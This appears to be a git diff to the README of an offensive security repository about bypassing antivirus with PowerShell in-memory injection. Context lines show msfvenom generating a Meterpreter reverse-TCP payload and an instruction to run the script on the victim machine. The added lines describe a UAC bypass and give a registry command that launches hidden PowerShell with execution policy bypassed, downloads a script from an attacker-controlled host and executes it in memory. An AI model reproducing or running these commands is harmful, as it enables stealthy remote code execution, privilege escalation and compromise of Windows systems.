@@ -17,3 +17,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IPkali LPORT=4444 -f powershel
 ![Captura de pantalla 2023-02-27 210359.jpg](https://raw.githubusercontent.com/sergiovks/AntiVirus-Bypass-PowerShell-In-Memory-Injection/main/screenshots/Captura%20de%20pantalla%202023-02-27%20210359.jpg)
 
 <h3>Save the final PowerShell script and run it within the victim Windows machine.</h3>
+
+<h3>We can combine this script with the use of the following command in order to download and inject the script as an Administrator user bypassing UAC:</h3>
+
+First of all you have to setup a python web server to host the payload, change the attacker IP and the PowerShell script name.
+
+```
+$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadString('http://IPattacker/script.ps1'); Invoke-Function"
+```
